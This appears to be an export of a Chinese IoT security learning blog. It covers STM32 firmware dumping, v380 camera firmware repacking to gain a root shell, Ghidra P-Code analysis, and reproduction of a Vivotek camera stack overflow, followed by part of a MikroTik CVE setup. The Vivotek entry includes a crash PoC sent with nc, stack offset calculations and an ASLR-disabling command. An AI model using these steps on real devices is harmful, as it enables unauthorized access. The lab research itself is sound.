<li>引脚定义：目录4Pinouts and pin descriptions：依据STM32f030，找到Table 11. STM32F030x4/6/8/C pin definitions，依据QFP64的封装方式，找到pin number为LQFP64那一列</li>
</ul>
</li>
<li>内存映射：目录5 Memory mapping<ul>
<li>CODE：广义上固件</li>
<li>Flash memory：内置的 Flash（硬盘）</li>
<li>System memory：预置了一段 BootLoader、为了从串口下载程序（ROM）</li>
<li>SRAW：内置 SRAM、一般用于程序调试（内存）</li>
<li>狭义上固件：Flash Memory 中，起始地址为 0x8000000 ，大小为 x40000</li>
</ul>
</li>
<li>找调试接口<ul>
<li>调试方式：读手册，swd，Serial Wire Debug，与JTAG的20个引脚相比，SWD只需要4个（或者5个）引脚</li>
<li>封装方式：由图可见，采用QFP64封装，4x16=64</li>
<li>芯片型号：看芯片丝印，STM32f030 RCT6</li>
<li>确定调试接口：SWDIO（输入输出）、SWCLK（时钟）、VSS（电源）、RESET（重置）</li>
</ul>
</li>
<li>步骤<ul>
<li>openocd安装：apt、源码（厂商定制化的）</li>
<li>接线：根据芯片丝印下载手册、手册中找调试接口</li>
<li>固件位置及大小：手册</li>
<li>启动openocd</li>
<li>telnet 连接 locahsot:4444 端口：halt 中断代码执行、dump_image导出固件</li>
<li>dump_image 格式： 文件名 起始地址 导出的数据长度，dump_image flash.bin 0x8000000 0x40000</li>
</ul>
</li>
<li>代码读取保护<ul>
<li>芯片开启代码读取保护（CRP/RDP），防止固件被提取</li>
<li>此法（即openocd提取固件），可应用在 IOT 安全测试中，验证 CRP 是否开启</li>
</ul>
</li>
</ul>
<blockquote>
<p>参考：<a href="https://www.anquanke.com/post/id/227285" target="_blank" rel="noopener">https://www.anquanke.com/post/id/227285</a></p>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>固件提取</tag>
      </tags>
  </entry>
  <entry>
    <title>v380摄像头固件重打包getshell</title>
    <url>/2021/01/09/iot/v380%E6%91%84%E5%83%8F%E5%A4%B4%E5%9B%BA%E4%BB%B6%E9%87%8D%E6%89%93%E5%8C%85getshell/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="v380摄像头固件重打包getshell"><a href="#v380摄像头固件重打包getshell" class="headerlink" title="v380摄像头固件重打包getshell"></a>v380摄像头固件重打包getshell</h1><ul>
<li>RTSP：实时流协议 (Real Time Streaming Protocol)</li>
<li>patchV380：<a href="https://github.com/bcaller/v380-ipcam-firmware-patch/" target="_blank" rel="noopener">https://github.com/bcaller/v380-ipcam-firmware-patch/</a></li>
<li>更新流程<ol>
<li>检查md5、hwname</li>
<li>从固件中提取文件到/tmp/hu_files_tmpdir/</li>
<li>执行exshell_bfu.sh，before update</li>
<li>复制通用文件和音乐文件到/mnt/mtd/和/mnt/mtd/mvsound/</li>
<li>/sbin/updater刷入kernel和mtd</li>
<li>执行exshell_afu.sh，after update</li>
</ol>
</li>
<li>Linux set命令用于设置shell。-x：执行指令后，会先显示该指令及所下的参数。</li>
<li>passwd记录</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># root:$5$EvgtGUo1zRnZRW$Ge399ZNp3EYQP1NJt7MF1fbYjfnhtloG5m1N2KCp9l0:10933:0:99999:7:::</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 举例：$1$abcdefg$Qp6zr7K0tHxV79N9cCLSc1</span></span><br><span class="line">密码部分由三个部分组成，由<span class="string">'$'</span>分割。 </span><br><span class="line">按照<span class="string">'$'</span>分割后分别是加密方式（1），salt值（abcdefg），加密后的密码串（Qp6zr7K0tHxV79N9cCLSc1）。 </span><br><span class="line">目前加密方式有6种，最常见的只有3种： </span><br><span class="line">	1:MD5加密，密文长度22 </span><br><span class="line">	5:SHA-256加密，密文长度43 </span><br><span class="line">	6:SHA-512加密，密文长度86</span><br></pre></td></tr></table></figure>
<ul>
<li>mkpasswd工具</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 非Linux，自行下载</span></span><br><span class="line"><span class="comment"># method、salt、明文</span></span><br><span class="line">$ mkpasswd --method=sha256crypt --salt=EvgtGUo1zRnZRW Hello.123</span><br><span class="line"><span class="variable">$5</span><span class="variable">$EvgtGUo1zRnZRW</span><span class="variable">$2A2sE5yjjsR2K6QJH0Te2rKOUGaCRXiEIgdr9e5KlO0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>/sbin/updater刷入kernel和mtd，用到ioctl函数，比如erase mtd</li>
<li>cat提取mtd内容<ul>
<li>：<code>cat /dev/mtd4ro &gt; /mnt/sdcard/mtd4</code> （插入内存卡）</li>
<li>/dev/mtd?是字符设备，允许字节流的方式访问</li>
</ul>
</li>
<li>固件重打包获取shell<ul>
<li>提取出shadow文件所在的mtd，cat /dev/mtd</li>
<li>提取文件系统，unsquashfs</li>
<li>修改shadow文件，mkpasswd生成密文</li>
<li>重新打包mtd，mksquashfs</li>
<li>将新mtd添加至固件，patchv380</li>
<li>更新固件，存放至内存卡</li>
</ul>
</li>
</ul>
<blockquote>
<p>参考：<a href="https://blog.caller.xyz/v380-ipcam-firmware-patching/" target="_blank" rel="noopener">https://blog.caller.xyz/v380-ipcam-firmware-patching/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>摄像头</tag>
        <tag>固件分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Ghidra&#39;s P-Code-识别程序敏感函数</title>
    <url>/2020/12/21/reverse/Ghidra&#39;s%20P-Code-%E8%AF%86%E5%88%AB%E7%A8%8B%E5%BA%8F%E6%95%8F%E6%84%9F%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h1 id="Ghidra’s-P-Code-识别程序敏感函数"><a href="#Ghidra’s-P-Code-识别程序敏感函数" class="headerlink" title="Ghidra’s P-Code-识别程序敏感函数"></a>Ghidra’s P-Code-识别程序敏感函数</h1><ul>
<li>参数情况：14处调用，5种情况</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># const：常数</span></span><br><span class="line"><span class="comment"># 共4</span></span><br><span class="line">	int x = 9;</span><br><span class="line">	int y = 10;</span><br><span class="line">	malloc(5);</span><br><span class="line">	malloc(x);</span><br><span class="line">	malloc(x + y);</span><br><span class="line">	malloc(5);</span><br><span class="line"></span><br><span class="line"><span class="comment"># func-ret：函数返回，明确的返回值，自定义函数</span></span><br><span class="line"><span class="comment"># 共6</span></span><br><span class="line">	malloc(return3());</span><br><span class="line">	malloc(getNumber()+65);</span><br><span class="line">	malloc(getNumber2());</span><br><span class="line">	malloc(y + return3());</span><br><span class="line">	malloc(getarg1(888888));</span><br><span class="line">	malloc(phidemo());</span><br><span class="line"></span><br><span class="line"><span class="comment"># func-no-ret：函数返回，无法计算返回值，库函数</span></span><br><span class="line"><span class="comment"># 共2</span></span><br><span class="line">	malloc(strlen(string));</span><br><span class="line">	malloc(rand());</span><br><span class="line"></span><br><span class="line"><span class="comment"># arg：调用者参数</span></span><br><span class="line"><span class="comment"># 共1</span></span><br><span class="line">	malloc(z);</span><br><span class="line"></span><br><span class="line"><span class="comment"># multi：多个可能值</span></span><br><span class="line"><span class="comment"># 共1</span></span><br><span class="line">	int a = 0x4444;</span><br><span class="line">	<span class="keyword">if</span> (rand() &gt; 2)&#123;</span><br><span class="line">		a = z;</span><br><span class="line">	&#125;</span><br><span class="line">	malloc(a);</span><br></pre></td></tr></table></figure>
<ul>
<li>有两处malloc</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># </span></span><br><span class="line">	Found malloc @ 0x400510</span><br><span class="line">	Found malloc @ 0x602020</span><br><span class="line">	</span><br><span class="line"><span class="comment"># 0x400510</span></span><br><span class="line">void * malloc(size_t __size)</span><br><span class="line">&#123;</span><br><span class="line">  void *pvVar1;</span><br><span class="line">  </span><br><span class="line">  pvVar1 = malloc(__size);</span><br><span class="line">  <span class="built_in">return</span> pvVar1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">004007bb		CALL &lt;EXTERNAL&gt;::malloc	UNCONDITIONAL_CALL</span><br><span class="line">004007c8		CALL &lt;EXTERNAL&gt;::malloc	UNCONDITIONAL_CALL</span><br><span class="line">...</span><br><span class="line">004007ee		CALL &lt;EXTERNAL&gt;::malloc	UNCONDITIONAL_CALL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x602020</span></span><br><span class="line">void * malloc(size_t __size)</span><br><span class="line">&#123;</span><br><span class="line">                    /* WARNING: Bad instruction - Truncating control flow here */</span><br><span class="line">                    /* malloc@@GLIBC_2.2.5 */</span><br><span class="line">  halt_baddata();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">00400510	malloc	JMP qword ptr [-&gt;&lt;EXTERNAL&gt;::malloc]	COMPUTED_CALL_TERMINATOR</span><br><span class="line">00400510	malloc	JMP qword ptr [-&gt;&lt;EXTERNAL&gt;::malloc]	THUNK</span><br><span class="line">00601030	PTR_malloc_00601030	addr &lt;EXTERNAL&gt;::malloc	DATA</span><br></pre></td></tr></table></figure>
<ul>
<li>analyzefun-malloc(return3());</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 0x4007ee </span></span><br><span class="line"><span class="comment"># 参数来自return3返回值</span></span><br><span class="line">int analyzefun(char * string, int z)&#123;</span><br><span class="line">	malloc(return3());</span><br><span class="line"></span><br><span class="line"><span class="comment"># 尽管有多处调用，但返回是明确值，故停止于const 3</span></span><br><span class="line">int <span class="function"><span class="title">return3</span></span>()&#123;</span><br><span class="line">	<span class="built_in">return</span> 3;</span><br><span class="line"></span><br><span class="line"><span class="comment"># flow结构</span></span><br><span class="line"><span class="comment"># analyzefun调用malloc，但参数来自return3</span></span><br><span class="line">cur_flow_caller_func: analyzefun</span><br><span class="line">child_flow_called_func: return3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 子节点，新添caller_addr成员</span></span><br></pre></td></tr></table></figure>
<ul>
<li>analyzefun-malloc(getarg1(888888))</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 0x400869</span></span><br><span class="line"><span class="comment"># 参数来自getarg1返回值</span></span><br><span class="line">int analyzefun(char * string, int z)&#123;</span><br><span class="line">	malloc(getarg1(888888));</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回值不确定，取决于调用方参数</span></span><br><span class="line">int getarg1(int j)&#123;</span><br><span class="line">	<span class="built_in">return</span> j+4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># getarg1的调用：除了analyzefun，还有main</span></span><br><span class="line"><span class="comment"># 应该只看analyzefun的</span></span><br><span class="line">int main(int argv, char ** argc) &#123;</span><br><span class="line">	int jj = getarg1(5);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 代码修改</span></span><br><span class="line"><span class="comment"># trace_varnode：</span></span><br><span class="line">                Address caller_addr = def_pcode.getSeqnum().getTarget();</span><br><span class="line">                Function called_func = getFunctionAt(def_pcode.getInput(0).getAddress());</span><br><span class="line">                analyze_called_ret(flow, called_func, caller_addr, is_phi);</span><br><span class="line"><span class="comment"># analyze_called_ret</span></span><br><span class="line">            new_flow = new BasicFlow(called_func, caller_addr);</span><br><span class="line">            flow.add_child(new_flow);</span><br><span class="line"><span class="comment"># analyze_caller_arg</span></span><br><span class="line">                <span class="keyword">if</span> (parent_addr.getOffset() != flow.getAddress().getOffset()) &#123;</span><br><span class="line">                    <span class="built_in">continue</span>;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>analyzefun-malloc(z)//here</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 0x400855</span></span><br><span class="line"><span class="comment"># 来自调用方analyzefun参数</span></span><br><span class="line">int analyzefun(char * string, int z)&#123;</span><br><span class="line">	malloc(z);</span><br><span class="line">	</span><br><span class="line"><span class="comment"># 有多处调用analyzefun</span></span><br><span class="line">int intermediatefunc2(char * string, int y)&#123;</span><br><span class="line">	analyzefun(string, y);</span><br><span class="line">int main(int argv, char ** argc) &#123;</span><br><span class="line">	analyzefun(<span class="string">"foo"</span>, 77);</span><br><span class="line">	analyzefun(<span class="string">"bar"</span>, zz);</span><br></pre></td></tr></table></figure>
<ul>
<li>成员func</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># func 取决于 is_child/parents</span></span><br><span class="line"><span class="comment"># child: called_func</span></span><br><span class="line"><span class="comment"># parent: caller_func</span></span><br><span class="line">class BasicFlow &#123;</span><br><span class="line">    // field</span><br><span class="line">    public long const_value;</span><br><span class="line">    private boolean is_parent;</span><br><span class="line">    private boolean is_child;</span><br><span class="line">    private Function func;</span><br></pre></td></tr></table></figure>
<ul>
<li>flow输出</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1 常数，malloc(5);</span></span><br><span class="line">5</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 函数返回值，malloc(return3());</span></span><br><span class="line">return3</span><br><span class="line">5</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 malloc(getNumber()+65);</span></span><br><span class="line">65 + getNumber</span><br><span class="line">65 + [9, atoi, rand, oneOf3, 77, 11]</span><br><span class="line">65 + [9, atoi, rand, [1,2,3], 77, 11]</span><br><span class="line">[65+9, 65+atoi, 65+rand, 65+[1,2,3], 65+77, 65+11]</span><br><span class="line">[65+9, 65+atoi, 65+rand, 65+1, 65+2, 65+3, 65+77, 65+11]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">SINK: call to malloc <span class="keyword">in</span> analyzefun @ 0x400805</span><br><span class="line">-C: getNumber</span><br><span class="line">--ØCONST: 9 (0x9)</span><br><span class="line">--ØC: atoi</span><br><span class="line">--Ø-C: atoi</span><br><span class="line">--ØC: rand</span><br><span class="line">--Ø-C: rand</span><br><span class="line">--ØC: oneOf3</span><br><span class="line">--Ø-ØCONST: 1 (0x1)</span><br><span class="line">--Ø-ØCONST: 2 (0x2)</span><br><span class="line">--Ø-ØCONST: 3 (0x3)</span><br><span class="line">--ØCONST: 77 (0x4d)</span><br><span class="line">--ØCONST: 11 (0xb)</span><br><span class="line">-CONST: 65 (0x41)</span><br></pre></td></tr></table></figure>
<ul>
<li>暂不搞了<ul>
<li>真实情况远没有此例子复杂，比如system参数一般是静态字符串，随用随查吧</li>
<li>来自参数、返回值这些情况，调用流复杂，有没有更好的结构来表示</li>
<li>怎样输出更直观，比如malloc(getNumber()+65)，最终[65+9, 65+atoi, 65+rand, 65+1, 65+2, 65+3, 65+77, 65+11]，加号怎么存储</li>
</ul>
</li>
</ul>
<blockquote>
<p>参考：<a href="https://www.riverloopsecurity.com/blog/2019/05/pcode/" target="_blank" rel="noopener">https://www.riverloopsecurity.com/blog/2019/05/pcode/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>软件安全/逆向</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title>IOT设备固件提取方法</title>
    <url>/2020/11/21/iot/IOT%E8%AE%BE%E5%A4%87%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>[toc]</p>
<h2 id="IOT设备固件提取方法"><a href="#IOT设备固件提取方法" class="headerlink" title="IOT设备固件提取方法"></a>IOT设备固件提取方法</h2><ul>
<li>见pdf：智能设备漏洞挖掘中几个突破点-马良_看雪论坛发布</li>
<li>flash相当于硬盘</li>
<li>cpu、内存、存储都分多钟设备内运行的软件即固件</li>
<li>电路板会有调试接口，用于开发、维护</li>
<li>串口分两种（按电压），ttl和rs232，因为异步所以有波特率的概念</li>
<li>nor贵、容量小、存储代码、cpu直接寻址、容量越大地址线越多</li>
<li>nand便宜、容量大、存数据，不可直接寻址，需驱动程序</li>
<li>设备软件和硬件的协作关系：内存、固件（uboot、kernel、fs）、存储</li>
<li>维护接口：设备升级、调试、固件更新</li>
<li>九种提固件，软件硬件两大类：<ul>
<li>官网（或社工客服）、</li>
<li>升级包流量（命名规律）、</li>
<li>逆向升级软件（上下位机）、</li>
<li>jtag接口（小马哥两次演讲待看）、</li>
<li>uart串口下uboot（最稳妥可靠，详看）、</li>
<li>拆flash等存储设备（用编程器）、</li>
<li>逻辑分析仪（注意频率）、</li>
<li>shell权限（利用原来的软硬件）、</li>
<li>web及通讯漏洞（密码泄漏）</li>
</ul>
</li>
<li>最可靠的uart+uboot：<ul>
<li>修改uboot脚本，不用密码进系统，5条md可以把Nor flash的内容显示出来，用于提固件</li>
<li>uboot提固件，三个难度</li>
<li>各种uboot命令</li>
<li>主要是提固件方法，其它略看</li>
</ul>
</li>
</ul>
<blockquote>
<p>参考：智能设备漏洞挖掘中几个突破点-马良_看雪论坛发布</p>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>固件提取</tag>
      </tags>
  </entry>
  <entry>
    <title>vivetok摄像头-栈溢出漏洞分析</title>
    <url>/2020/08/12/iot/vivetok%E6%91%84%E5%83%8F%E5%A4%B4-%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>[toc]</p>
<h2 id="vivetok摄像头-栈溢出漏洞分析"><a href="#vivetok摄像头-栈溢出漏洞分析" class="headerlink" title="vivetok摄像头-栈溢出漏洞分析"></a>vivetok摄像头-栈溢出漏洞分析</h2><blockquote>
<p>1 第一次看</p>
</blockquote>
<ul>
<li><p>解压后，固件后缀是.flash.pkg，果然与路由器的.bin不一样</p>
</li>
<li><p>binwalk提取后的文件结构也不同，/_31.extracted/_rootfs.img.extracted/squashfs-root</p>
</li>
<li><p>find发现有两个httpd：./etc/init.d/httpd、./usr/sbin/httpd，看usr下的（前者好像跟启动有关</p>
</li>
<li><p>方便qemu虚拟机启动，将相关命令封装成shell脚本run.sh</p>
</li>
<li><p>tar + scp 将文件系统传送至qemu虚拟机</p>
</li>
<li><p>运行httpd前：mount -o bind /dev ./squashfs-root/dev/、mount -t proc /proc/ ./squashfs-root/proc/、chroot squashfs-root sh</p>
</li>
<li><p>第一次出错：Could not open boa.conf for reading</p>
<ol>
<li>要找文件：/etc/conf.d/boa/boa.conf（/是squashfs-root</li>
<li>ll etc/conf.d：/etc/conf.d -&gt; ../mnt/flash/etc/conf.d（..是针对conf.d的，故要上一层目录</li>
<li>替换后，故要找：/mnt/flash/etc/conf.d/boa/boa.conf（但是目录下没有压根没有/conf.d/boa/boa.conf</li>
<li>binwalk提取后的根目录find：<code>/_31.extracted/defconf/_CC8160.tar.bz2.extracted/_0.extracted/etc/conf.d/boa/boa.conf</code></li>
<li>因此：将上面的4中的/conf.d/boa/boa.conf，拷贝至/mnt/flash即可（直接拷整个conf.d目录</li>
<li>（慢慢理，别乱、重新tar+scp传一份、重新运行</li>
</ol>
</li>
<li><p>qemu中rm -rf竟然没权限，明明是root啊，不知原因（可能是chroot后的缘故</p>
</li>
<li><p>scp失败，ssh-keygen -R 10.10.10.2后也不行，重启arm虚拟机</p>
</li>
<li><p>第二次出错：gethostbyname:: Network is unreachable</p>
<ul>
<li>应该是qemu虚拟机和固件的系统的<code>host name</code>不一样，导致无法获取。</li>
<li>Linux 操作系统的 hostname 是一个 kernel 变量，可以通过 hostname 命令来查看本机的 hostname。将二者的<code>/etc/hosts</code>改成一样就可以了。</li>
<li>hostname得到：debian-armhf，将固件中的etc/hosts由：127.0.0.1 Network-Camera localhost改为127.0.0.1 debian-armhf localhost</li>
</ul>
</li>
<li><p>解决出错问题的思路</p>
<ul>
<li>IDA中patch程序，重新保存（复现ac15路由器时</li>
<li>本复现中两次解决错误</li>
</ul>
</li>
<li><p>httpd -h，可以看到httpd运行的参数。使用<code>httpd -l 32768</code>参数显示最多的调试信息。（-l debug_level、最大是32768：Transfer messaging</p>
</li>
<li><p>修复两次错误后，httpd可运行成功，ctrl+c后再运行，就提示：unable to bind: Address already in use（上次结束后，地址或者端口没被释放？重启arm虚拟机解决</p>
</li>
<li><p>poc：echo -en “POST /cgi-bin/admin/upgrade.cgi HTTP/1.0nContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXXnrnrn”  | nc -v 10.10.10.2 80</p>
</li>
<li><p>可以看到服务端已经崩溃：caught SIGSEGV, dumping core in /tmp（尽管此时我没-l 32768</p>
</li>
<li><p>根据字符串找漏洞点时：Content-Length与CONTENT_LENGTH还是不同的，与Content-Length: 也是不同的</p>
</li>
<li><p>漏洞成因：将漏洞点所在函数rename为：aaa_Vuln<br>  进入python命令行，chr(n)将ascii转为字符<br>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-26-134224.png" alt="image-20200514102115791"></p>
</li>
<li><p>看strncpy接受数据的空间即dest，</p>
<ul>
<li>反汇编窗口中计算得到：ADD     R0, SP, #0x50+dest、-00000038 dest，所以dest=r0=sp+0x50-0x38=sp+0x18</li>
<li>反编译窗口中直接得到：char dest[4]; // [sp+18h] [bp-38h]</li>
</ul>
</li>
<li><p>aaa_Vuln中函数序言：STMFD   SP!, {R4-R11,LR}，<a href="https://blog.csdn.net/weiwei_xiaoyu/article/details/20563479" target="_blank" rel="noopener">https://blog.csdn.net/weiwei_xiaoyu/article/details/20563479</a></p>
</li>
<li><p>用sp定位LR：</p>
<ul>
<li>STMFD   SP!, {R4-R11,LR}：LR = sp+4*8（LR在地址高处，其次11、10</li>
<li>SUB     SP, SP, #0x2C：sp = sp-0x2c</li>
<li>所以：LR= sp+0x2c+4*8</li>
</ul>
</li>
<li><p>计算偏移</p>
<ul>
<li>dest = sp+0x18</li>
<li>LR= sp+0x2c+4*8</li>
<li>偏移 = LR-dest = 0x2c+4*8 -0x18 = 0x34</li>
</ul>
</li>
<li><p>checksec本身是pwngdb中的工具，可在gdb中调试该程序时执行，也可直接在命令行checksec+程序路径</p>
</li>
<li><p>查看Linux下PIE开启情况：cat /proc/sys/kernel/randomize_va_space</p>
<ul>
<li>0 - 表示关闭进程地址空间随机化。</li>
<li>1 - 表示将mmap的基址，stack和vdso页面随机化。</li>
<li>2 - 表示在1的基础上增加栈（heap）的随机化。</li>
</ul>
</li>
<li><p>方便测试，直接将PIE关闭，echo 0 &gt; /proc/sys/kernel/randomize_va_space（qemu-arm虚拟机中</p>
</li>
<li><p>Linux系统与程序的PIE：前者决定后者，如果Linux中改为0，即使checksec后发现程序支持PIE，也是无效的</p>
</li>
<li><p>ssh连接qemu-arm虚拟机，在ssh命令行下ps找进程号、运行gdbserver，因为arm虚拟机已经chroot到squashfs-root，好多命令都没了</p>
</li>
<li><p>远程调试</p>
<ul>
<li>qemu-arm：httpd</li>
<li>连接qemu-arm的ssh：ps -aux ｜grep httpd、./gdbserver-7.7.1-armhf-eabi5-v1-sysv :1234 –attach 3564（+x添加执行权限、注意gdb与冒号间要有一空格、1234是开启的监听端口、3564是httpd的进程号</li>
<li>Ubuntu：gdb-multiarch usr/sbin/httpd、target remote 10.10.10.2:1234</li>
</ul>
</li>
<li><p>最终exp：</p>
<ul>
<li>倒数第2、6行的反斜杠被网页吃掉了</li>
<li>IP地址、libc基地址要修改</li>
<li>（system和gadget地址，如果是同一个libc，exp中和自己机器上的，一般会一样，但不绝对</li>
<li>find ./ -name “libc.so.0”，找一个libc，果然找到，lib/libc.so.0，按经验一般都会加载这个的</li>
<li>readelf -s lib/libc.so.0 |grep system，找到system地址00047ab0（相对地址</li>
<li>通过ROPgadget找（并未实际测试，如何找rop有待学习</li>
<li>不知哪里有问题，exp复现失败，写exp非现在重点，了解大致思路即可，故未深究</li>
</ul>
</li>
<li><p>gdb打开远程调试时，会断在刚开始的地方，</p>
<ul>
<li>此时好多动态库还没有加载（比如vmmpa时就没看到libc.so.0），</li>
<li>但是Continue起来后，又没法输入指令，如何解决？</li>
<li>IDA中实现找到溢出点所在那个函数（反正进入main之后的就行），continue前提前下断，运行起来后就会断下，此时再vmmap即可（本例子中实测失败</li>
</ul>
</li>
<li><p>本文中gdbserver与看雪的不同：<a href="https://bbs.pediy.com/thread-258148.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-258148.htm</a></p>
</li>
<li><p>试一下IDA远程调试，但需要做本地端口转发</p>
<ul>
<li>qemu-arm：httpd</li>
<li>连接qemu-arm的ssh：ps -aux ｜grep httpd、./gdbserver-7.7.1-armhf-eabi5-v1-sysv :1234 –attach 3564</li>
<li>macos：ssh <a href="mailto:lxl@192.168.156.222" target="_blank" rel="noopener">lxl@192.168.156.222</a> -L :8000:10.10.10.2:1234</li>
<li>mac中IDA：连接127.0.0.1:8000即可</li>
<li>（运行exp，同GDB中一样，都发生异常</li>
</ul>
</li>
<li><p>远程调试：IAD不能看动态库的加载，gdb用vmmap可以</p>
</li>
<li><p>bindiff</p>
<ul>
<li>安装：<a href="https://www.zynamics.com/bindiff/manual/，" target="_blank" rel="noopener">https://www.zynamics.com/bindiff/manual/，</a></li>
<li>不能直接打开二进制程序，需要ida打开再退出生成的idb文件</li>
<li>选择好两个idb文件后，diff后还报错</li>
<li>IDA中打开其中一个文件，再点diff，显示正在处理，也一直没处理完，垃圾</li>
<li>（从ida中插件打开bindiff，提示缺少binexport</li>
</ul>
</li>
</ul>
<blockquote>
<p>2 （第二次看）</p>
</blockquote>
<ul>
<li>漏洞成因：找到Content-Length字段，strstr找到”:”和”\n”，提取出中间的值，再strncpy拷贝至局部变量，值应该是数字但是可放字符串，且用户可控</li>
<li><p>固件：</p>
<ul>
<li>社工客服法：<a href="https://xz.aliyun.com/t/5054" target="_blank" rel="noopener">https://xz.aliyun.com/t/5054</a></li>
<li><a href="ftp://ftp.vivotek.com/Firmware/CC8160/CC8160-VVTK-0100d.flash.pkg、fae-fae" target="_blank" rel="noopener">ftp://ftp.vivotek.com/Firmware/CC8160/CC8160-VVTK-0100d.flash.pkg、fae-fae</a></li>
<li>本例8160而非8130</li>
</ul>
</li>
<li><p>疑问</p>
</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">可以看到是gethostbyname，应该是qemu虚拟机和固件的系统的host name不一样，导致无法获取。Linux 操作系统的 hostname 是一个 kernel 变量，可以通过 hostname 命令来查看本机的 hostname。将二者的/etc/hosts改成一样就可以了</span><br></pre></td></tr></table></figure>
<ul>
<li>漏洞点路径（boa）：main、loop、process_requests、read_header</li>
</ul>
<blockquote>
<p>参考：<a href="https://www.anquanke.com/post/id/185336" target="_blank" rel="noopener">https://www.anquanke.com/post/id/185336</a></p>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>漏洞分析</tag>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>MikroTik溢出即CVE-2018-7445漏洞分析</title>
    <url>/2020/07/02/iot/MikroTik%E6%BA%A2%E5%87%BA%E5%8D%B3CVE-2018-7445%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>[toc]</p>
<h2 id="MikroTik溢出即CVE-2018-7445漏洞分析"><a href="#MikroTik溢出即CVE-2018-7445漏洞分析" class="headerlink" title="MikroTik溢出即CVE-2018-7445漏洞分析"></a>MikroTik溢出即CVE-2018-7445漏洞分析</h2><ul>
<li>下载漏洞固件：<ul>
<li><a href="https://mikrotik.com/download/archive，mikrotik-6.40.6.iso" target="_blank" rel="noopener">https://mikrotik.com/download/archive，mikrotik-6.40.6.iso</a> 官网404</li>
<li><a href="https://www.coresecurity.com/advisories/mikrotik-routeros-smb-buffer-overflow查看漏洞信息，All" target="_blank" rel="noopener">https://www.coresecurity.com/advisories/mikrotik-routeros-smb-buffer-overflow查看漏洞信息，All</a> architectures and all devices running RouterOS before versions 6.41.3/6.42rc27，4.41.3前均可</li>
<li>下载6.40.8，<a href="https://download.mikrotik.com/routeros/6.40.8/mikrotik-6.40.8.iso" target="_blank" rel="noopener">https://download.mikrotik.com/routeros/6.40.8/mikrotik-6.40.8.iso</a></li>
</ul>
</li>
<li>用iso安装虚拟机失败，总提示no harddrivers found，<ul>
<li>直接下载硬盘：<a href="https://download.mikrotik.com/routeros/6.40.8/chr-6.40.8.vmdk" target="_blank" rel="noopener">https://download.mikrotik.com/routeros/6.40.8/chr-6.40.8.vmdk</a></li>
<li>参考<a href="https://medium.com/@maxi./finding-and-exploiting-cve-2018-7445-f3103f163cc1" target="_blank" rel="noopener">https://medium.com/@maxi./finding-and-exploiting-cve-2018-7445-f3103f163cc1</a></li>
<li>设置-硬盘-移除当前的硬盘（需先关机）、添加设备-现有硬盘-选择上述刚下载的vmdk，</li>
<li>重启虚拟机，admin和空密码登录</li>
</ul>
</li>
<li>setup命令设置ip<ul>
<li>直接默认即可，dns那设置一个8.8的</li>
<li>ip address print查看IP</li>
<li>其他命令：<a href="https://www.cnblogs.com/zoulongbin/p/5887746.html" target="_blank" rel="noopener">https://www.cnblogs.com/zoulongbin/p/5887746.html</a></li>
</ul>
</li>
<li>连接路由器：ssh <a href="mailto:admin@192.168.156.227" target="_blank" rel="noopener">admin@192.168.156.227</a><ul>
<li>空密码，直接就能进去、</li>
<li>admin@IP的形式，不要ssh ip</li>
</ul>
</li>
<li>python的SimpleHTTPServer、python3的http.server</li>
<li>Rooteros不支持一些基本的linux命令,为了更方便的操作,需要将busybox和gdbserver 放进去<ul>
<li>将CD/DVD选择为一个ubuntu的镜像</li>
<li>启动磁盘，选择CD/DVD，然后重新启动</li>
<li>选择 try ubuntu</li>
